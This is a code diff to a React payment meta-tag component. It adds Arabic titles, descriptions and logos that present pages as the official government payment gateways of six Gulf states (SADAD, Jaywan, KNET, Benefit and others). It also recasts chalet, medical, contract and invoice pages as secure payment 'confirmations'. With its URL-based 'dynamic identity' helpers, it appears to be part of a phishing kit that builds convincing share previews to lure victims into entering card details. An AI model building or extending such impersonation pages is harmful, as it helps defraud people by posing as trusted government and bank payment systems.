@@ -3,6 +3,38 @@ import { getServiceBranding } from '@/lib/serviceLogos';
 import { getEntityPaymentShareImage, getEntityIdentity, detectEntityFromURL, getBankOGImage } from '@/lib/dynamicIdentity';
 
 const companyMeta: Record<string, { title: string; description: string; image: string }> = {
+  // Government Systems
+  gov_sa: {
+    title: "بوابة سداد للمدفوعات الحكومية 🇸🇦",
+    description: "نظام المدفوعات الوطني السعودي - سدد رسوم الخدمات الحكومية والفواتير بأمان تام وسهولة عبر بوابة سداد الموحدة ✅",
+    image: "/assets/dynamic-identity/sadad_hero.jpg"
+  },
+  gov_ae: {
+    title: "بوابة جيوان للمدفوعات الإلكترونية 🇦🇪",
+    description: "نظام البطاقة الوطنية الإماراتي - سدد فواتيرك وخدماتك الحكومية بأمان عبر منظومة الدفع الوطنية الإماراتية 💳",
+    image: "/assets/dynamic-identity/jaywan_hero.jpg"
+  },
+  gov_kw: {
+    title: "بوابة كي نت للمدفوعات الوطنية 🇰🇼",
+    description: "شبكة الكويت الوطنية للمدفوعات الإلكترونية - سدد رسومك الحكومية بأمان وموثوقية عبر بوابة KNET الرسمية 🇰🇼",
+    image: "/assets/dynamic-identity/knet_hero.jpg"
+  },
+  gov_qa: {
+    title: "بوابة قطر للمدفوعات الحكومية 🇶🇦",
+    description: "نظام الدفع الإلكتروني الموحد لدولة قطر - سدد جميع مستحقات الخدمات الحكومية بأعلى معايير الأمان 🇶🇦",
+    image: "/assets/dynamic-identity/qatar_gov_hero.jpg"
+  },
+  gov_om: {
+    title: "بوابة مال للمدفوعات الوطنية 🇴🇲",
+    description: "منظومة الدفع الإلكتروني الوطنية لسلطنة عُمان - سداد سريع وآمن لجميع الرسوم والخدمات عبر بوابة مال 🇴🇲",
+    image: "/assets/dynamic-identity/maal_hero.jpg"
+  },
+  gov_bh: {
+    title: "بوابة بنفت للمدفوعات الوطنية 🇧🇭",
+    description: "الشبكة الإلكترونية البحرينية للمعاملات المالية - سدد رسومك وخدماتك الحكومية بأمان تام عبر منظومة بنفت 🇧🇭",
+    image: "/assets/dynamic-identity/benefit_hero.jpg"
+  },
+
   aramex: {
     title: "دفع آمن - أرامكس للشحن السريع 🚚",
     description: "خدمات شحن عالمية مع أرامكس - أكمل عملية الدفع بأمان تام للحصول على خدمات شحن سريعة وموثوقة في جميع أنحاء الخليج والعالم ✅",
@@ -69,39 +101,39 @@ const companyMeta: Record<string, { title: string; description: string; image: s
     image: "/og-bahpost.jpg"
   },
   chalets: {
-    title: "دفع آمن - حجز الشاليهات والاستراحات 🏖️",
-    description: "حجز شاليهات فاخرة واستراحات مريحة - ادفع بأمان واحجز إقامتك المثالية مع عروض حصرية وخدمات متميزة في جميع أنحاء الخليج 🌟",
-    image: "/og-chalets.jpg"
+    title: "تأكيد حجز شاليه - دفع آمن 🏠",
+    description: "أكمل عملية الدفع بأمان تام لتأكيد حجز شاليهك المفضل - نظام دفع مشفر وموثوق ✅",
+    image: "/assets/dynamic-identity/chalets_image1.svg"
+  },
+  health_links: {
+    title: "تأكيد موعد طبي - دفع آمن 🏥",
+    description: "بوابة الحجوزات الطبية الإلكترونية - سدد رسوم الكشف والخدمات الصحية بأمان تام لتأكيد موعدك 🏥",
+    image: "/assets/dynamic-identity/health_image1.svg"
   },
   contracts: {
-    title: "دفع آمن - العقود والاتفاقيات القانونية 📄",
-    description: "تسديد العقود والاتفاقيات - أكمل دفعتك بأمان للعقود العقارية والتجارية والخدمية مع حماية قانونية كاملة وموثقة ✅",
-    image: "/og-contracts.jpg"
+    title: "توثيق عقد إلكتروني - دفع آمن 📄",
+    description: "بوابة العقود والتوثيق الموحدة - أكمل سداد رسوم التوثيق لاعتماد عقدك الإلكتروني قانونياً ⚖️",
+    image: "/assets/dynamic-identity/contract_image1.svg"
   },
   invoices: {
-    title: "دفع آمن - الفواتير والمستحقات 📋",
-    description: "دفع الفواتير إلكترونياً - سدد فواتيرك ومستحقاتك بكل سهولة وأمان مع تأكيد فوري ومتابعة دقيقة لجميع معاملاتك المالية 💰",
-    image: "/og-invoices.jpg"
+    title: "سداد فاتورة إلكترونية - دفع آمن 🧾",
+    description: "مركز سداد الفواتير الموحد - سدد فواتيرك المستحقة بأمان وسرعة عبر منصتنا المشفرة ✅",
+    image: "/assets/dynamic-identity/invoice_image1.svg"
   },
   government_payment: {
     title: "دفع آمن - الخدمات الحكومية 🏛️",
     description: "دفع الخدمات والرسوم الحكومية - سدد رسومك الحكومية إلكترونياً بأمان تام مع سداد، بنفت، مدى وجميع أنظمة الدفع الحكومية المعتمدة ✅",
-    image: "/og-government_payment.jpg"
-  },
-  health_links: {
-    title: "دفع آمن - الخدمات الصحية والطبية 🏥",
-    description: "دفع الخدمات الصحية والطبية - سدد فواتيرك الطبية، التأمين الصحي، والمستشفيات بأمان مع تأكيد فوري وخصوصية تامة 🩺",
-    image: "/og-health_links.jpg"
+    image: "/assets/dynamic-identity/official_logo_gov.svg"
   },
   local_payment: {
     title: "دفع آمن - المدفوعات المحلية 💳",
     description: "خدمات الدفع المحلي السريع - سدد مدفوعاتك المحلية بسهولة وأمان مع دعم جميع وسائل الدفع المحلية المعتمدة في دول الخليج 🌍",
-    image: "/og-local_payment.jpg"
+    image: "/assets/dynamic-identity/official_logo_local.svg"
   },
   bank_pages: {
     title: "دفع آمن - البنوك الخليجية 🏦",
     description: "الدفع عبر البنوك الخليجية - اختر بنكك المفضل من أكثر من 50 بنك خليجي وأكمل معاملتك المالية بأمان وسرعة فائقة 💎",
-    image: "/og-bank_pages.jpg"
+    image: "/assets/dynamic-identity/official_logo_bank.svg"
   },
   default: {
     title: "منصة الدفع الذكية - خدمات دفع آمنة لدول الخليج 💳",
@@ -147,7 +179,7 @@ export const PaymentMetaTags: React.FC<PaymentMetaTagsProps> = ({
   
   const pageTitle = title || companyMetaData.title;
   const pageDescription = description || customDescription || companyMetaData.description || entityDescription || branding.description;
-  const ogImage = ogImagePath ? `${window.location.origin}${ogImagePath}` : undefined;
+  const ogImage = ogImagePath ? (ogImagePath.startsWith('http') ? ogImagePath : `${window.location.origin}${ogImagePath}`) : undefined;
   
   return (
     <Helmet>
@@ -176,7 +208,7 @@ export const PaymentMetaTags: React.FC<PaymentMetaTagsProps> = ({
       
       <meta name="theme-color" content={entityIdentity?.colors.primary || branding.colors.primary} />
       
-      {ogImagePath && <link rel="preload" as="image" href={ogImagePath} />}
+      {ogImagePath && !ogImagePath.startsWith('http') && <link rel="preload" as="image" href={ogImagePath} />}
       <link rel="preconnect" href="https://fonts.googleapis.com" />
       <link rel="preconnect" href="https://fonts.gstatic.com" crossOrigin="anonymous" />
       
